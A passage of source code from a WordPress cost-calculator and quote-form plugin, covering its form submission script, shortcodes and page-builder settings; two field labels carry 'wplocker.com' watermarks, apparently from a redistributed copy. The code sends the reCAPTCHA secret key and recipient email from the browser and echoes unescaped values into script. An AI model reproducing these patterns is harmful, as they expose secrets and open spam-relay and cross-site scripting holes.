					$( this ).closest( '.btQuoteBooking' ).find( '.btQuoteBookingForm' ).removeClass( 'btActive' );
				});
				
				c.find( '.btContactSubmit' ).click(function() {
				
					c.find( '.btContactFieldError' ).removeClass( 'btContactFieldError' );
			
					var val = true;
					
					c.find( '.btContactField' ).each(function() {
						if ( $( this ).parent().hasClass( 'btContactFieldMandatory' ) 
						&& ( ( $( this ).val() == '' && ! $( this ).hasClass( 'btContactTime' ) ) 
						|| ( $( this ).hasClass( 'btContactTime' ) && $( this ).hasClass( 'btNotSelected' ) ) ) ) {
							$( this ).parent().addClass( 'btContactFieldError' );
							val = false;
						}
					});
					
					if ( ! val ) {
						c.find( '.btSubmitMessage' ).hide().html( '<?php echo __( 'Please fill out all required fields.', 'bt_plugin' ); ?>' ).fadeIn();
						return false;
					}

					var quote = '';
					var back = 0;
					var bt_is_odd = function( n ) {
						return ( n % 2 ) == 1;
					}

					c.find( '.btQuoteItem' ).each(function() {
						back++;
						var item_val = 0;
						var selected_name = '';
						
						$( this ).find( '.btQuoteText' ).each(function() {
							item_val = bt_parse_float( $( this ).val() );
						});
						
						$( this ).find( '.btQuoteSelect' ).find( '._msddli_.selected' ).each(function() {
							selected_name = $( this ).find( '.ddlabel' )[0].innerHTML;
							if ( $( this ).is( ':first-child' ) ) {
								selected_name = '';
							}
							item_val = bt_parse_float( $( this ).data( 'value' ) );
						});
						
						$( this ).find( '.btQuoteSlider' ).each(function() {
							item_val = bt_parse_float( $( this ).slider( 'value' ) );
						});

						$( this ).find( '.btQuoteSwitch' ).each(function() {
							if ( $( this ).hasClass( 'on' ) ) {
								item_val = bt_parse_float( $( this ).data( 'on' ) );
							} else {
								item_val = bt_parse_float( $( this ).data( 'off' ) );
							}
						});
						
						var label = $( this ).find( 'label' ).html();
						
						if ( selected_name != '' ) {
							selected_name = selected_name.replace( '<span class="description">', '/' );
							selected_name = selected_name.replace( '</span>', '' );
							label = label + ': ' + selected_name;
						}
						
						var background = '';
						if ( bt_is_odd( back ) ) background = ' ' + 'style="background:#eee;"';
						
						item_val = item_val.toFixed( 2 );
						
						if ( label !== undefined ) {
							quote += encodeURI( '<tr' + background + '>\r\n<td style="padding:.5em;">' + label + '</td>\r\n<td style="text-align:right;padding:.5em;">' + item_val + '</td>\r\n</tr>' ) + "\r\n";
						}
					});
					
					var recaptcha_response = '';
					if ( typeof grecaptcha !== 'undefined' ) {
						var recaptcha_response = grecaptcha.getResponse();
						grecaptcha.reset();
					}
					
					var email_confirmation = 'no';
					if ( c.find( '#bt_cc_email_confirmation' ).length ) {
						if ( c.find( '#bt_cc_email_confirmation' ).prop( 'checked' ) ) {
							email_confirmation = 'yes';
						}
					} else {
						email_confirmation = 'yes';
					}

					var data = {
						'action': 'bt_cc',
						'recaptcha_response': recaptcha_response,
						'recaptcha_secret': rec_secret_key,
						'admin_email': '<?php echo $this->admin_email; ?>',
						'email_client': '<?php echo $this->email_client; ?>',
						'email_confirmation': email_confirmation,
						'subject': '<?php echo urlencode( $this->subject ); ?>',
						'quote' : quote,
						'total' : total,
						'name' : c.find( '.btContactName' ).val(),
						'email' : c.find( '.btContactEmail' ).val(),
						'phone' : c.find( '.btContactPhone' ).val(),
						'address' : c.find( '.btContactAddress' ).val(),
						'date' : c.find( '.btContactDate' ).val(),
						'time' : c.find( '.btContactTime' ).val(),
						'message' : c.find( '.btContactMessage' ).val()
					};
					
					c.find( '.btSubmitMessage' ).hide().html( '<?php echo __( 'Please wait...', 'bt_plugin' ); ?>' ).fadeIn();
					
					$.ajax({
						type: 'POST',
						url: '<?php echo admin_url( 'admin-ajax.php' ); ?>',
						data: data,
						async: true,
						success: function( response ) {
							response = $.trim( response );
							if ( response == 'ok' ) {
								c.find( '.btSubmitMessage' ).hide().html( '<?php echo __( 'Thank you, we will contact you soon!', 'bt_plugin' ); ?>' ).fadeIn();
							} else {
								c.find( '.btSubmitMessage' ).hide().html( '<?php echo __( 'Error! Please try again later.', 'bt_plugin' ); ?>' ).fadeIn();
							}
						},
						error: function( xhr, status, error ) {
							c.find( '.btSubmitMessage' ).hide().html( '<?php echo __( 'Error! Please try again later.', 'bt_plugin' ); ?>' ).fadeIn();
						}
					});
				
				});
				
	        })( jQuery );
			
		</script>
	<?php }
}

class CostTime_Proxy {
	function __construct( $time_start, $time_end, $title, $css_class ) {
		$this->time_start = $time_start;
		$this->time_end = $time_end;
		$this->title = $title;
		$this->css_class = $css_class;
	}	

	public function js_init() { ?>
		<script>
			(function( $ ) {
				var css_class = '<?php echo $this->css_class; ?>';
				var c = $( '.' + css_class );
				
				var bt_time_ddData = [
				<?php
					echo '{ text:\'' . $this->title . '\', value:\'\' },';
					for ( $i = intval( $this->time_start ); $i <= intval( $this->time_end ); $i++ ) {
						if ( $i < 10 ) $i = '0' . $i;
						echo '{ text: \'' . $i . ':00\', value: \'' . $i . ':00\' },';
					}
				?>
				];
				
				c.find( '.btContactTime' ).msDropDown({
					byJson:{data:bt_time_ddData},
					on:{change:function( data, ui ) {
						var val = data.value;
						//console.log(val)
					}}
				});
				
	        })( jQuery );
			
		</script>
	<?php }
}

class CostDD_Proxy {
	function __construct( $dd_id, $items_arr, $title, $img_height ) {
		$this->dd_id = $dd_id;
		$this->items_arr = $items_arr;
		$this->title = $title;
		$this->img_height = $img_height;
	}	

	public function js_init() { ?>
		<script>
			(function( $ ) {
			
				var img_height = '<?php echo $this->img_height; ?>';
				if ( img_height != '' ) {
					$( 'head' ).append( '<style>.ddImage img {height:' + img_height + 'px !important;}</style>' );
				}			
			
				var ddData = [
				<?php
					echo '{ text:\'' . $this->title . '\', value:\'\' },';
					foreach ( $this->items_arr as $item ) {
						$arr = explode( ';', $item );
						if ( ! isset( $arr[3] ) ) {
							$arr[3] = '';
						}
						echo '{ text: \'' . $arr[0] . '\', value: \'' . floatval( $arr[1] ) . '\', description: \'' . sanitize_text_field( $arr[2] ) . '\', image: \'' . $arr[3] . '\' },';
					}
				?>
				];
				
				$( '#<?php echo $this->dd_id; ?>' ).msDropDown({
					byJson:{data:ddData},
					on:{change:function( data, ui ) {
						var val = data.value;
						ui.data( 'value', val );
						bt_quote_total( $( ui ).closest( '.btQuoteBooking' ) );
						bt_paypal_items( $( ui ).closest( '.btQuoteBooking' ) );
					}}
				});
				
	        })( jQuery );
			
		</script>
	<?php }
}

// [bt_cc_item]
class bt_cc_item {
	static function init() {
		add_shortcode( 'bt_cc_item', array( __CLASS__, 'handle_shortcode' ) );
	}

	static function handle_shortcode( $atts, $content ) {
		extract( shortcode_atts( array(
			'name'        => '',
			'type'        => 'text',
			'value'       => '',
			'images'      => '',
			'img_height'  => ''
		), $atts, 'bt_cc_item' ) );
		
		$name = sanitize_text_field( $name );
		$type = sanitize_text_field( $type );
		$images = sanitize_text_field( $images );
		$img_height = sanitize_text_field( $img_height );
		
		$images = explode( ',', $images );

		if ( $type == 'text' ) {
		
			$price = round( floatval( $value ), 2 );
			$input = '<input type="text" class="btQuoteText" data-price="' . $price . '"/>';
			
		} else if ( $type == 'select' ) {
		
			$items_arr = preg_split( '/$\R?^/m', $value );
			
			$i = 0;
			foreach ( $items_arr as $item ) {
				if ( isset( $images[ $i ] ) ) {
					$items_arr[ $i ] = sanitize_text_field( $items_arr[ $i ] . ';' . wp_get_attachment_thumb_url( $images[ $i ] ) );
				}  
				$i++;
			}

			$dd_id = uniqid();
			
			$input = '<div id="' . $dd_id . '" class="btQuoteSelect btContactField btDropDown"></div>';
			
			$proxy = new CostDD_Proxy( $dd_id, $items_arr, __( 'Select...', 'bt_plugin' ), $img_height );
			add_action( 'wp_footer', array( $proxy, 'js_init' ), 20 );			
			
		} else if ( $type == 'slider' ) {
		
			$arr = explode( ';', $value );
			$price = round( floatval( $arr[3] ), 2 );
			$offset = isset( $arr[4] ) ? round( floatval( $arr[4] ), 2 ) : 0;
			$input = '<div class="btQuoteSlider" data-min="' . $arr[0] . '" data-max="' . $arr[1] . '" data-step="' . $arr[2] . '" data-price="' . $price . '" data-offset="' . $offset . '"></div><span class="btQuoteSliderValue"></span>';
			
		} else if ( $type == 'switch' ) {
		
			$arr = explode( ';', $value );
			if ( ! is_array( $arr ) || count( $arr ) < 2 ) {
				$arr = array( 0, 1 );
			}
			$input = '<div class="btQuoteSwitch" data-off="' . $arr[0] . '" data-on="' . $arr[1] . '"><div class="btQuoteSwitchInner"></div></div>';
			
		}
		
		$output = '<div class="btQuoteItem"><label>' . $name . '</label><div class="btQuoteItemInput">' . $input . '</div></div>';

		return $output;
	}
}

// [bt_cc_multiply]
class bt_cc_multiply {
	static function init() {
		add_shortcode( 'bt_cc_multiply', array( __CLASS__, 'handle_shortcode' ) );
	}

	static function handle_shortcode( $atts, $content ) {
		extract( shortcode_atts( array(

		), $atts, 'bt_cc_multiply' ) );
		
		$output = '<div class="btQuoteMBlock">' . wptexturize( do_shortcode( $content ) ) . '</div>';

		return $output;
	}
}

// [bt_cc_group]
class bt_cc_group {
	static function init() {
		add_shortcode( 'bt_cc_group', array( __CLASS__, 'handle_shortcode' ) );
	}

	static function handle_shortcode( $atts, $content ) {
		extract( shortcode_atts( array(
			'eval'         => '',
			'paypal_label' => ''
		), $atts, 'bt_cc_group' ) );
		
		$output = '<div class="btQuoteGBlock" data-eval="' . strip_tags( $eval ) . '" data-paypal_label="' . $paypal_label . '">' . wptexturize( do_shortcode( $content ) ) . '</div>';

		return $output;
	}
}

bt_cost_calculator::init();
bt_cc_item::init();
bt_cc_multiply::init();
bt_cc_group::init();

/*
 * * * * * * * * * *
 * RC / VC MAPPING *
 * * * * * * * * * *
 */

function bt_quote_map_sc() {

	$time_array = array();
	$time_array[ '' ] = '';
	for ( $i = 0; $i <= 23; $i++ ) {
		if ( $i < 10 ) $i = '0' . $i;
		$time_array[ $i . ':00' ] =  $i . ':00';
	}
	
	$bt_quote_params = array(
		array( 'param_name' => 'admin_email', 'type' => 'textfield', 'heading' => __( 'Admin Email - w.p.l.o.c.k.e.r..c.o.m', 'bt_plugin' ), 'preview' => true ),
		array( 'param_name' => 'subject', 'type' => 'textfield', 'heading' => __( 'Email Subject', 'bt_plugin' ) ),
		array( 'param_name' => 'email_client', 'type' => 'checkbox', 'value' => array( 'Yes' => 'yes' ), 'heading' => __( 'Send Email to Client', 'bt_plugin' ) ),
		array( 'param_name' => 'email_confirmation', 'type' => 'checkbox', 'value' => array( 'Show confirmation checkbox for sending email to client' => 'yes' ), 'heading' => __( 'Email Confirmation', 'bt_plugin' ) ),		
		array( 'param_name' => 'time_start', 'type' => 'dropdown', 'heading' => __( 'Preferred Time Start', 'bt_plugin' ),
			'value' => $time_array
		),
		array( 'param_name' => 'time_end', 'type' => 'dropdown', 'heading' => __( 'Preferred Time End', 'bt_plugin' ),
			'value' => $time_array
		),
		array( 'param_name' => 'currency', 'type' => 'textfield', 'heading' => __( 'Currency', 'bt_plugin' ) ),
		array( 'param_name' => 'm_name', 'type' => 'checkbox', 'value' => array( 'Yes' => 'Mandatory' ), 'heading' => __( 'Mandatory Name', 'bt_plugin' ) ),
		array( 'param_name' => 'm_email', 'type' => 'checkbox', 'value' => array( 'Yes' => 'Mandatory' ), 'heading' => __( 'Mandatory Email', 'bt_plugin' ) ),
		array( 'param_name' => 'm_phone', 'type' => 'checkbox', 'value' => array( 'Yes' => 'Mandatory' ), 'heading' => __( 'Mandatory Phone', 'bt_plugin' ) ),
		array( 'param_name' => 'm_address', 'type' => 'checkbox', 'value' => array( 'Yes' => 'Mandatory' ), 'heading' => __( 'Mandatory Address', 'bt_plugin' ) ),
		array( 'param_name' => 'm_date', 'type' => 'checkbox', 'value' => array( 'Yes' => 'Mandatory' ), 'heading' => __( 'Mandatory Preferred Date', 'bt_plugin' ) ),
		array( 'param_name' => 'm_time', 'type' => 'checkbox', 'value' => array( 'Yes' => 'Mandatory' ), 'heading' => __( 'Mandatory Preferred Time', 'bt_plugin' ) ),
		array( 'param_name' => 'm_message', 'type' => 'checkbox', 'value' => array( 'Yes' => 'Mandatory' ), 'heading' => __( 'Mandatory Message', 'bt_plugin' ) ),
		array( 'param_name' => 'accent_color', 'type' => 'colorpicker', 'heading' => __( 'Accent Color', 'bt_plugin' ) ),
		array( 'param_name' => 'show_booking', 'type' => 'checkbox', 'value' => array( 'Yes' => 'yes' ), 'heading' => __( 'Show Date/Time Fields', 'bt_plugin' ) ),
		array( 'param_name' => 'rec_site_key', 'type' => 'textfield', 'heading' => __( 'reCAPTCHA Site key', 'bt_plugin' ) ),
		array( 'param_name' => 'rec_secret_key', 'type' => 'textfield', 'heading' => __( 'reCAPTCHA Secret key', 'bt_plugin' ) ),
		array( 'param_name' => 'paypal_email', 'type' => 'textfield', 'heading' => __( 'Your PayPal account email address', 'bt_plugin' ) ),
		array( 'param_name' => 'paypal_cart_name', 'type' => 'textfield', 'heading' => __( 'Shopping cart name', 'bt_plugin' ) ),
		array( 'param_name' => 'paypal_currency', 'type' => 'textfield', 'heading' => __( 'Currency code (USD, EUR, GBP, CAD, JPY)', 'bt_plugin' ) ),
		array( 'param_name' => 'el_class', 'type' => 'textfield', 'heading' => __( 'Extra Class Name(s)', 'bt_plugin' ) ),
		array( 'param_name' => 'el_style', 'type' => 'textfield', 'heading' => __( 'Inline Style - W P L O C K E R .C O M', 'bt_plugin' ) )
	);
	
	$bt_cc_item_params = array(	
		array( 'param_name' => 'name', 'type' => 'textfield', 'heading' => __( 'Name', 'bt_plugin' ), 'holder' => 'div' ),
		array( 'param_name' => 'type', 'type' => 'dropdown', 'heading' => __( 'Input Type', 'bt_plugin' ), 'holder' => 'div',
			'value' => array(
				__( 'Text', 'bt_plugin' ) => 'text',
				__( 'Select', 'bt_plugin' ) => 'select',
				__( 'Slider', 'bt_plugin' ) => 'slider',
				__( 'Switch', 'bt_plugin' ) => 'switch'
		) ),
		array( 'param_name' => 'value', 'type' => 'textarea', 'heading' => __( 'Value', 'bt_plugin' ), 'description' => __( 'unit_value for Text / name;value;description separated by new line for Select / min;max;step;unit_value;offset_value for Slider / value_off;value_on for Switch', 'bt_plugin' ) ),
		array( 'param_name' => 'images', 'type' => 'attach_images', 'heading' => __( 'Images for Select input type', 'bt_plugin' ) ),
		array( 'param_name' => 'img_height', 'type' => 'textfield', 'heading' => __( 'Images Height in px', 'bt_plugin' ) ),
	);	
	
	$bt_cc_multiply_params = array();
	$bt_cc_group_params = array(
		array( 'param_name' => 'eval', 'type' => 'textarea', 'heading' => __( 'JS pseudo code', 'bt_plugin' ), 'description' => __( '$1, $2, etc. can be used to reference values of items inside this group; always use return to return the value', 'bt_plugin' ) ),
		array( 'param_name' => 'paypal_label', 'type' => 'textfield', 'heading' => __( 'PayPal Label', 'bt_plugin' ), 'description' => __( 'If label is not entered, this group will not be included in PayPal payment', 'bt_plugin' ) ),
	);

	if ( function_exists( 'bt_rc_map' ) ) {
		
		bt_rc_map( 'bt_cost_calculator', array( 'name' => __( 'Cost Calculator', 'bt_plugin' ), 'description' => __( 'Cost calculator container', 'bt_plugin' ), 'container' => 'vertical', 'accept' => array( 'bt_cc_item' => true, 'bt_cc_multiply' => true, 'bt_cc_group' => true, 'bt_hr' => true, 'bt_header' => true, 'bt_text' => true ), 'toggle' => true,
			'params' => $bt_quote_params
		));
		
		bt_rc_map( 'bt_cc_item', array( 'name' => __( 'Cost Calculator Item', 'bt_plugin' ), 'description' => __( 'Single cost calculator element', 'bt_plugin' ),
			'params' => $bt_cc_item_params
		));
		
		bt_rc_map( 'bt_cc_multiply', array( 'name' => __( 'Cost Calculator Multiply', 'bt_plugin' ), 'description' => __( 'Cost calculator multiply container', 'bt_plugin' ), 'container' => 'vertical', 'accept' => array( 'bt_cc_item' => true ), 'show_settings_on_create' => false,
			'params' => $bt_cc_multiply_params
		));
		
		bt_rc_map( 'bt_cc_group', array( 'name' => __( 'Cost Calculator Group', 'bt_plugin' ), 'description' => __( 'Cost calculator group container', 'bt_plugin' ), 'container' => 'vertical', 'accept' => array( 'bt_cc_item' => true ), 'show_settings_on_create' => false,
			'params' => $bt_cc_group_params
		));		
	}
	
	if ( function_exists( 'vc_map' ) ) {
		
		if ( class_exists( 'WPBakeryShortCodesContainer' ) ) {
			class WPBakeryShortCode_bt_cost_calculator extends WPBakeryShortCodesContainer {
			}
		}
		
		if ( class_exists( 'WPBakeryShortCodesContainer' ) ) {
			class WPBakeryShortCode_bt_cc_multiply extends WPBakeryShortCodesContainer {
			}
		}
		
		if ( class_exists( 'WPBakeryShortCodesContainer' ) ) {
			class WPBakeryShortCode_bt_cc_group extends WPBakeryShortCodesContainer {
			}
		}
	
		$data = array();
		$data['name']              = __( 'Cost Calculator', 'bt_plugin' );
		$data['base']              = 'bt_cost_calculator';
		$data['as_parent']         = array( 'except' => 'vc_row,vc_column,vc_row_inner,vc_column_inner' );
		$data['content_element']   = true;
		$data['js_view']           = 'VcColumnView';
		$data['category']          = 'Content';
		$data['icon']              = 'bt_quote_icon';
		$data['admin_enqueue_css'] = array( plugins_url() . '/bt_cost_calculator/vc_style.css' );
		$data['description']       = __( 'Cost calculator container', 'bt_plugin' );

		$data['params'] = $bt_quote_params;

		vc_map( $data );
		
		
		$data = array();
		$data['name']              = __( 'Cost Calculator Item', 'bt_plugin' );
		$data['base']              = 'bt_cc_item';
		$data['content_element']   = true;
		$data['category']          = 'Content';
		$data['as_child']          = array( 'only' => 'bt_cost_calculator,bt_cc_multiply,bt_cc_group' );
		$data['icon']              = 'bt_quote_icon_item';
		$data['admin_enqueue_css'] = array( plugins_url() . '/bt_cost_calculator/vc_style.css' );
		$data['description']       = __( 'Cost calculator item', 'bt_plugin' );

		$data['params'] = $bt_cc_item_params;
		
		vc_map( $data );
		
		
		$data = array();
		$data['name']              = __( 'Cost Calculator Multiply', 'bt_plugin' );
		$data['base']              = 'bt_cc_multiply';
		$data['as_parent']         = array( 'only' => 'bt_cc_item' );
		$data['as_child']          = array( 'only' => 'bt_cost_calculator' );
		$data['content_element']   = true;
		$data['js_view']           = 'VcColumnView';
		$data['category']          = 'Content';
		$data['icon']              = 'bt_quote_icon_multiply';
		$data['admin_enqueue_css'] = array( plugins_url() . '/bt_cost_calculator/vc_style.css' );
		$data['description']       = __( 'Cost calculator multiply container', 'bt_plugin' );

		$data['params'] = $bt_cc_multiply_params;
		
		vc_map( $data );
		
		
		$data = array();
		$data['name']              = __( 'Cost Calculator Group', 'bt_plugin' );
		$data['base']              = 'bt_cc_group';
		$data['as_parent']         = array( 'only' => 'bt_cc_item' );
		$data['as_child']          = array( 'only' => 'bt_cost_calculator' );
		$data['content_element']   = true;
		$data['js_view']           = 'VcColumnView';
		$data['category']          = 'Content';
		$data['icon']              = 'bt_quote_icon_group';
		$data['admin_enqueue_css'] = array( plugins_url() . '/bt_cost_calculator/vc_style.css' );
		$data['description']       = __( 'Cost calculator group container', 'bt_plugin' );

		$data['params'] = $bt_cc_group_params;
		
		vc_map( $data );
		
	}
}
add_action( 'plugins_loaded', 'bt_quote_map_sc' );